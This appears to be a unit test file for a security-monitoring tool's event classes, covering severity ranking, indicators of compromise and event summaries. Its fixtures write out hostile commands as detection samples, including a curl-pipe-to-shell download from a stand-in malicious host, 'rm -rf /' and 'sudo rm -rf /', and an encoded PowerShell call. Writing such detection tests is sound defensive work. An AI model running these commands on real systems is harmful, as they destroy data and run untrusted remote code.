/**
 * Unit tests for Security Event Classes
 */

import { expect, use } from 'chai';
const sinonChai = require('sinon-chai');

use(sinonChai);
import { ExtensionInfo, WorkspaceInfo, Target } from '../../lib/events/ext-events';
import { NetworkEvent } from '../../lib/events/network-events';
import { ExecEvent } from '../../lib/events/process-events';
import { TaskEvent } from '../../lib/events/task-events';
import { SecurityEvent, SeverityLevel, IoC, compareSeverity, getHighestSeverity } from '../../lib/events/sec-events';
import { ProcessRuleType } from '../../detection/process-rules';
import { NetworkRuleType } from '../../detection/network-rules';
import { TaskRuleType } from '../../detection/task-rules';

suite('SecurityEvent Tests', () => {
  suite('SeverityLevel', () => {
    test('compareSeverity should compare correctly', () => {
      expect(compareSeverity(SeverityLevel.HIGH, SeverityLevel.LOW)).to.be.greaterThan(0);
      expect(compareSeverity(SeverityLevel.LOW, SeverityLevel.HIGH)).to.be.lessThan(0);
      expect(compareSeverity(SeverityLevel.MEDIUM, SeverityLevel.MEDIUM)).to.equal(0);
    });

    test('compareSeverity order should be LOW < MEDIUM < HIGH', () => {
      expect(compareSeverity(SeverityLevel.LOW, SeverityLevel.MEDIUM)).to.be.lessThan(0);
      expect(compareSeverity(SeverityLevel.MEDIUM, SeverityLevel.HIGH)).to.be.lessThan(0);
      expect(compareSeverity(SeverityLevel.LOW, SeverityLevel.HIGH)).to.be.lessThan(0);
    });

    test('getHighestSeverity should return highest', () => {
      const severities = [SeverityLevel.LOW, SeverityLevel.HIGH, SeverityLevel.MEDIUM];
      expect(getHighestSeverity(severities)).to.equal(SeverityLevel.HIGH);
    });

    test('getHighestSeverity should handle single severity', () => {
      expect(getHighestSeverity([SeverityLevel.MEDIUM])).to.equal(SeverityLevel.MEDIUM);
    });

    test('getHighestSeverity should handle all same severity', () => {
      expect(getHighestSeverity([SeverityLevel.LOW, SeverityLevel.LOW])).to.equal(SeverityLevel.LOW);
    });

    test('getHighestSeverity should return LOW for empty array', () => {
      expect(getHighestSeverity([])).to.equal(SeverityLevel.LOW);
    });
  });

  suite('IoC Interface', () => {
    test('should have all required properties', () => {
      const ioc: IoC = {
        finding: 'suspicious pattern',
        rule: 'Test Rule',
        description: 'Test description',
        confidence: 0.9,
        severity: SeverityLevel.HIGH,
      };

      expect(ioc.finding).to.equal('suspicious pattern');
      expect(ioc.rule).to.equal('Test Rule');
      expect(ioc.description).to.equal('Test description');
      expect(ioc.confidence).to.equal(0.9);
      expect(ioc.severity).to.equal(SeverityLevel.HIGH);
    });
  });

  suite('SecurityEvent - General Tests', () => {
    let extensionInfo: ExtensionInfo;
    let execEvent: ExecEvent;
    let iocs: IoC[];

    setup(() => {
      extensionInfo = new ExtensionInfo('test.extension', true, Date.now());
      execEvent = new ExecEvent('curl', ['http://example.com'], {}, __filename, extensionInfo);
      iocs = [
        {
          finding: 'curl http://example.com',
          rule: 'Command Injection',
          description: 'Detected command injection attempt',
          confidence: 1,
          severity: SeverityLevel.HIGH,
        },
      ];
    });

    test('should create with extension source', () => {
      const secEvent = new SecurityEvent(execEvent, extensionInfo, SeverityLevel.HIGH, ProcessRuleType.COMMAND, iocs);

      expect(secEvent.extension).to.equal(extensionInfo);
      expect(secEvent.workspace).to.be.undefined;
      expect(secEvent.severity).to.equal(SeverityLevel.HIGH);
      expect(secEvent.securityEventType).to.equal(ProcessRuleType.COMMAND);
    });

    test('should use original event ID as secEventId', () => {
      const secEvent = new SecurityEvent(execEvent, extensionInfo, SeverityLevel.HIGH, ProcessRuleType.COMMAND, iocs);

      expect(secEvent.secEventId).to.equal(execEvent.eventId);
    });

    test('should store IoCs', () => {
      const secEvent = new SecurityEvent(execEvent, extensionInfo, SeverityLevel.HIGH, ProcessRuleType.COMMAND, iocs);

      expect(secEvent.iocs).to.deep.equal(iocs);
    });

    test('should store original event', () => {
      const secEvent = new SecurityEvent(execEvent, extensionInfo, SeverityLevel.HIGH, ProcessRuleType.COMMAND, iocs);

      expect(secEvent.originalEvent).to.equal(execEvent);
    });

    test('should set timestamp', () => {
      const secEvent = new SecurityEvent(execEvent, extensionInfo, SeverityLevel.HIGH, ProcessRuleType.COMMAND, iocs);

      expect(secEvent.timestamp).to.exist;
      expect(secEvent.timestamp).to.be.a('number');
    });

    test('should use custom timestamp if provided', () => {
      const customTimestamp = 12345;
      const secEvent = new SecurityEvent(
        execEvent,
        extensionInfo,
        SeverityLevel.HIGH,
        ProcessRuleType.COMMAND,
        iocs,
        customTimestamp,
      );

      expect(secEvent.timestamp).to.equal(customTimestamp);
    });

    test('getPrimaryIoC should return highest severity IoC', () => {
      const multipleIocs: IoC[] = [
        { finding: 'finding1', rule: 'Rule1', description: 'Desc1', confidence: 0.8, severity: SeverityLevel.LOW },
        { finding: 'finding2', rule: 'Rule2', description: 'Desc2', confidence: 0.9, severity: SeverityLevel.HIGH },
        { finding: 'finding3', rule: 'Rule3', description: 'Desc3', confidence: 0.7, severity: SeverityLevel.MEDIUM },
      ];

      const secEvent = new SecurityEvent(
        execEvent,
        extensionInfo,
        SeverityLevel.HIGH,
        ProcessRuleType.COMMAND,
        multipleIocs,
      );

      const primaryIoC = secEvent.getPrimaryIoC();
      expect(primaryIoC.severity).to.equal(SeverityLevel.HIGH);
      expect(primaryIoC.rule).to.equal('Rule2');
    });

    test('getPrimaryIoC should return highest confidence when severities equal', () => {
      const multipleIocs: IoC[] = [
        { finding: 'finding1', rule: 'Rule1', description: 'Desc1', confidence: 0.8, severity: SeverityLevel.HIGH },
        { finding: 'finding2', rule: 'Rule2', description: 'Desc2', confidence: 0.95, severity: SeverityLevel.HIGH },
      ];

      const secEvent = new SecurityEvent(
        execEvent,
        extensionInfo,
        SeverityLevel.HIGH,
        ProcessRuleType.COMMAND,
        multipleIocs,
      );

      const primaryIoC = secEvent.getPrimaryIoC();
      expect(primaryIoC.confidence).to.equal(0.95);
      expect(primaryIoC.rule).to.equal('Rule2');
    });

    test('getSummary should format primary IoC', () => {
      const secEvent = new SecurityEvent(execEvent, extensionInfo, SeverityLevel.HIGH, ProcessRuleType.COMMAND, iocs);

      const summary = secEvent.getSummary();
      expect(summary).to.include('Command Injection');
      expect(summary).to.include('Detected command injection attempt');
      expect(summary).to.include('high');
    });

    test('getSecurityEventData should return complete data', () => {
      const secEvent = new SecurityEvent(execEvent, extensionInfo, SeverityLevel.HIGH, ProcessRuleType.COMMAND, iocs);

      const data = secEvent.getSecurityEventData();
      expect(data.secEventId).to.equal(secEvent.secEventId);
      expect(data.timestamp).to.equal(secEvent.timestamp);
      expect(data.extension).to.equal(extensionInfo);
      expect(data.iocs).to.deep.equal(iocs);
      expect(data.summary).to.exist;
    });

    test('should handle workspace source', () => {
      const workspaceInfo = new WorkspaceInfo('test-workspace', '/path/to/workspace', false);
      const workspaceEvent = new ExecEvent('npm', ['install'], {}, __filename, extensionInfo);
      Object.defineProperty(workspaceEvent, 'eventType', { value: Target.WORKSPACE });

      const secEvent = new SecurityEvent(
        workspaceEvent,
        workspaceInfo,
        SeverityLevel.MEDIUM,
        ProcessRuleType.COMMAND,
        iocs,
      );

      expect(secEvent.workspace).to.equal(workspaceInfo);
      expect(secEvent.extension).to.be.undefined;
    });

    test('should store iocs property', () => {
      const secEvent = new SecurityEvent(execEvent, extensionInfo, SeverityLevel.HIGH, ProcessRuleType.COMMAND, iocs);

      expect(secEvent.iocs).to.deep.equal(iocs);
    });
  });

  suite('SecurityEvent with NetworkRuleType', () => {
    let extensionInfo: ExtensionInfo;
    let networkEvent: NetworkEvent;
    let iocs: IoC[];

    setup(() => {
      extensionInfo = new ExtensionInfo('test.extension', true, Date.now());
      networkEvent = new NetworkEvent(
        'https',
        'https://suspicious.example.com',
        'request:pre',
        __filename,
        extensionInfo,
      );
      iocs = [
        {
          finding: 'https://suspicious.example.com',
          rule: 'Suspicious Domain',
          description: 'Request to suspicious domain',
          confidence: 1,
          severity: SeverityLevel.HIGH,
        },
      ];
    });

    test('should create with NetworkRuleType.URL', () => {
      const secEvent = new SecurityEvent(networkEvent, extensionInfo, SeverityLevel.HIGH, NetworkRuleType.URL, iocs);

      expect(secEvent.securityEventType).to.equal(NetworkRuleType.URL);
      expect(secEvent.severity).to.equal(SeverityLevel.HIGH);
      expect(secEvent.extension).to.equal(extensionInfo);
      expect(secEvent.originalEvent).to.equal(networkEvent);
    });

    test('should create with NetworkRuleType.IP', () => {
      const ipIocs: IoC[] = [
        {
          finding: '192.168.1.100',
          rule: 'External IP',
          description: 'Request to external IP address',
          confidence: 1,
          severity: SeverityLevel.MEDIUM,
        },
      ];

      const secEvent = new SecurityEvent(networkEvent, extensionInfo, SeverityLevel.MEDIUM, NetworkRuleType.IP, ipIocs);

      expect(secEvent.securityEventType).to.equal(NetworkRuleType.IP);
      expect(secEvent.severity).to.equal(SeverityLevel.MEDIUM);
    });

    test('should use network event ID as secEventId', () => {
      const secEvent = new SecurityEvent(networkEvent, extensionInfo, SeverityLevel.HIGH, NetworkRuleType.URL, iocs);

      expect(secEvent.secEventId).to.equal(networkEvent.eventId);
    });

    test('should store IoCs for network events', () => {
      const secEvent = new SecurityEvent(networkEvent, extensionInfo, SeverityLevel.HIGH, NetworkRuleType.URL, iocs);

      expect(secEvent.iocs).to.deep.equal(iocs);
    });

    test('getSummary should format network security event', () => {
      const secEvent = new SecurityEvent(networkEvent, extensionInfo, SeverityLevel.HIGH, NetworkRuleType.URL, iocs);

      const summary = secEvent.getSummary();
      expect(summary).to.include('Suspicious Domain');
      expect(summary).to.include('Request to suspicious domain');
      expect(summary).to.include('high');
    });
  });

  suite('SecurityEvent with TaskRuleType', () => {
    let workspaceInfo: WorkspaceInfo;
    let taskEvent: TaskEvent;
    let iocs: IoC[];

    setup(() => {
      workspaceInfo = new WorkspaceInfo('test-workspace', '/path/to/workspace', false);
      taskEvent = new TaskEvent(
        'malicious-task',
        'shell',
        'workspace',
        'curl',
        ['http://malicious.com/script.sh', '|', 'sh'],
        workspaceInfo,
        __filename,
      );
      iocs = [
        {
          finding: 'curl http://malicious.com/script.sh | sh',
          rule: 'Task: Network Download',
          description: 'Task attempts to download and execute remote script',
          confidence: 1,
          severity: SeverityLevel.HIGH,
        },
      ];
    });

    test('should create with TaskRuleType.NETWORK', () => {
      const secEvent = new SecurityEvent(taskEvent, workspaceInfo, SeverityLevel.HIGH, TaskRuleType.NETWORK, iocs);

      expect(secEvent.securityEventType).to.equal(TaskRuleType.NETWORK);
      expect(secEvent.severity).to.equal(SeverityLevel.HIGH);
      expect(secEvent.workspace).to.equal(workspaceInfo);
      expect(secEvent.extension).to.be.undefined;
      expect(secEvent.originalEvent).to.equal(taskEvent);
    });

    test('should create with TaskRuleType.REMOTE_SCRIPT', () => {
      const remoteScriptIocs: IoC[] = [
        {
          finding: '/tmp/malicious.sh',
          rule: 'Task: Temporary Script Execution',
          description: 'Task executes a script from temporary directory',
          confidence: 1,
          severity: SeverityLevel.MEDIUM,
        },
      ];

      const secEvent = new SecurityEvent(
        taskEvent,
        workspaceInfo,
        SeverityLevel.MEDIUM,
        TaskRuleType.REMOTE_SCRIPT,
        remoteScriptIocs,
      );

      expect(secEvent.securityEventType).to.equal(TaskRuleType.REMOTE_SCRIPT);
      expect(secEvent.severity).to.equal(SeverityLevel.MEDIUM);
    });

    test('should create with TaskRuleType.DESTRUCTIVE', () => {
      const destructiveIocs: IoC[] = [
        {
          finding: 'rm -rf /',
          rule: 'Task: Recursive File Deletion',
          description: 'Task attempts to recursively delete files',
          confidence: 1,
          severity: SeverityLevel.MEDIUM,
        },
      ];

      const secEvent = new SecurityEvent(
        taskEvent,
        workspaceInfo,
        SeverityLevel.MEDIUM,
        TaskRuleType.DESTRUCTIVE,
        destructiveIocs,
      );

      expect(secEvent.securityEventType).to.equal(TaskRuleType.DESTRUCTIVE);
    });

    test('should create with TaskRuleType.PRIVILEGE_ESCALATION', () => {
      const privilegeIocs: IoC[] = [
        {
          finding: 'sudo rm -rf',
          rule: 'Task: Sudo Execution',
          description: 'Task uses sudo for privilege escalation',
          confidence: 1,
          severity: SeverityLevel.HIGH,
        },
      ];

      const secEvent = new SecurityEvent(
        taskEvent,
        workspaceInfo,
        SeverityLevel.HIGH,
        TaskRuleType.PRIVILEGE_ESCALATION,
        privilegeIocs,
      );

      expect(secEvent.securityEventType).to.equal(TaskRuleType.PRIVILEGE_ESCALATION);
    });

    test('should create with TaskRuleType.ENCODED_COMMAND', () => {
      const encodedIocs: IoC[] = [
        {
          finding: 'powershell -enc',
          rule: 'Task: PowerShell Encoded Command',
          description: 'Task uses PowerShell with encoded command',
          confidence: 1,
          severity: SeverityLevel.HIGH,
        },
      ];

      const secEvent = new SecurityEvent(
        taskEvent,
        workspaceInfo,
        SeverityLevel.HIGH,
        TaskRuleType.ENCODED_COMMAND,
        encodedIocs,
      );

      expect(secEvent.securityEventType).to.equal(TaskRuleType.ENCODED_COMMAND);
    });

    test('should use task event ID as secEventId', () => {
      const secEvent = new SecurityEvent(taskEvent, workspaceInfo, SeverityLevel.HIGH, TaskRuleType.NETWORK, iocs);

      expect(secEvent.secEventId).to.equal(taskEvent.eventId);
    });

    test('should store IoCs for task events', () => {
      const secEvent = new SecurityEvent(taskEvent, workspaceInfo, SeverityLevel.HIGH, TaskRuleType.NETWORK, iocs);

      expect(secEvent.iocs).to.deep.equal(iocs);
    });

    test('getSummary should format task security event', () => {
      const secEvent = new SecurityEvent(taskEvent, workspaceInfo, SeverityLevel.HIGH, TaskRuleType.NETWORK, iocs);

      const summary = secEvent.getSummary();
      expect(summary).to.include('Task: Network Download');
      expect(summary).to.include('Task attempts to download and execute remote script');
      expect(summary).to.include('high');
    });

    test('getSecurityEventData should return complete data for task events', () => {
      const secEvent = new SecurityEvent(taskEvent, workspaceInfo, SeverityLevel.HIGH, TaskRuleType.NETWORK, iocs);

      const data = secEvent.getSecurityEventData();
      expect(data.secEventId).to.equal(secEvent.secEventId);
      expect(data.timestamp).to.equal(secEvent.timestamp);
      expect(data.workspace).to.equal(workspaceInfo);
      expect(data.extension).to.be.undefined;
      expect(data.iocs).to.deep.equal(iocs);
      expect(data.summary).to.exist;
    });

    test('should handle workspace source for task events', () => {
      const secEvent = new SecurityEvent(taskEvent, workspaceInfo, SeverityLevel.HIGH, TaskRuleType.NETWORK, iocs);

      expect(secEvent.workspace).to.equal(workspaceInfo);
      expect(secEvent.extension).to.be.undefined;
      expect(secEvent.originalEvent.eventType).to.equal(Target.WORKSPACE);
    });

    test('getPrimaryIoC should work for task events with multiple IoCs', () => {
      const multipleIocs: IoC[] = [
        {
          finding: 'curl http://bad.com',
          rule: 'Rule1',
          description: 'Desc1',
          confidence: 0.8,
          severity: SeverityLevel.LOW,
        },
        {
          finding: 'sudo rm -rf /',
          rule: 'Rule2',
          description: 'Desc2',
          confidence: 0.9,
          severity: SeverityLevel.HIGH,
        },
        {
          finding: 'wget malware.sh',
          rule: 'Rule3',
          description: 'Desc3',
          confidence: 0.7,
          severity: SeverityLevel.MEDIUM,
        },
      ];

      const secEvent = new SecurityEvent(
        taskEvent,
        workspaceInfo,
        SeverityLevel.HIGH,
        TaskRuleType.NETWORK,
        multipleIocs,
      );

      const primaryIoC = secEvent.getPrimaryIoC();
      expect(primaryIoC.severity).to.equal(SeverityLevel.HIGH);
      expect(primaryIoC.rule).to.equal('Rule2');
    });
  });
});
